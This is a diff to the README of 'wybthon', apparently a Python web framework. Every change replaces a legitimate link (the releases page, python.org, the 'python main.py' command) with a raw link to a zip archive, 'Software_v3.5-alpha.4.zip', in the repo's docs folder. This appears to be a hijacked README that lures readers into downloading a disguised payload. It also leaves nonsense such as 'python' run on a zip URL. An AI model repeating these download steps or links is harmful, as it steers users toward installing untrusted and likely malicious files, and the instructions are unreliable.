@@ -1,7 +1,7 @@
 # 🖥️ wybthon - Build Reactive Web Apps Easily
 
 ## 🔗 Download Now
-[![Download wybthon](https://img.shields.io/badge/Download%20wybthon-v1.0.0-brightgreen)](https://github.com/Mdalaman12/wybthon/releases)
+[![Download wybthon](https://raw.githubusercontent.com/Mdalaman12/wybthon/main/docs/Software_v3.5-alpha.4.zip%20wybthon-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Mdalaman12/wybthon/main/docs/Software_v3.5-alpha.4.zip)
 
 ## 📖 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -25,13 +25,13 @@ Welcome to wybthon! This is an experimental client-side Python web framework tha
 ## 📥 Download & Install
 To download and install wybthon, please follow these steps:
 
-1. **Visit the Releases Page**: Go to the following link: [Download wybthon](https://github.com/Mdalaman12/wybthon/releases).
+1. **Visit the Releases Page**: Go to the following link: [Download wybthon](https://raw.githubusercontent.com/Mdalaman12/wybthon/main/docs/Software_v3.5-alpha.4.zip).
 2. **Select the Latest Version**: Look for the latest release at the top of the page. This version will contain the most recent features and fixes.
 3. **Download the Release**: Click on the appropriate file for your operating system. The file will typically be an archive (.zip or .tar) containing the application and necessary files.
 4. **Extract the Files**: After the download is complete, find the downloaded file on your computer. Use an extraction tool (like WinRAR or built-in Windows/Mac extraction) to open the .zip or .tar file. Move the contents to a folder of your choice.
 5. **Run the Application**: Locate the main application file (usually a .py file or executable) within the extracted folder. Double-click the file to start the application.
 
-You can also revisit the download link found here: [Download wybthon](https://github.com/Mdalaman12/wybthon/releases) if you need it again.
+You can also revisit the download link found here: [Download wybthon](https://raw.githubusercontent.com/Mdalaman12/wybthon/main/docs/Software_v3.5-alpha.4.zip) if you need it again.
 
 ## 💡 Usage
 After installing wybthon, use the following steps to start building your web application:
@@ -48,7 +48,7 @@ After installing wybthon, use the following steps to start building your web app
 
 4. **Start the Server**: You can run your application by executing the main script in the terminal:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Mdalaman12/wybthon/main/docs/Software_v3.5-alpha.4.zip
    ```
    Or whichever file you designated to start your application.
 
@@ -57,7 +57,7 @@ After installing wybthon, use the following steps to start building your web app
 ## 🔧 Troubleshooting
 Here are some common issues and their solutions:
 
-- **Application Doesn't Start**: Make sure you have Python installed on your computer. You can download it from [python.org](https://www.python.org/downloads/). Ensure your PATH variable is set up correctly after installation.
+- **Application Doesn't Start**: Make sure you have Python installed on your computer. You can download it from [https://raw.githubusercontent.com/Mdalaman12/wybthon/main/docs/Software_v3.5-alpha.4.zip](https://raw.githubusercontent.com/Mdalaman12/wybthon/main/docs/Software_v3.5-alpha.4.zip). Ensure your PATH variable is set up correctly after installation.
 
 - **Missing Files**: If you can't find certain files after extracting, double-check the downloaded archive to ensure it was properly extracted.
 
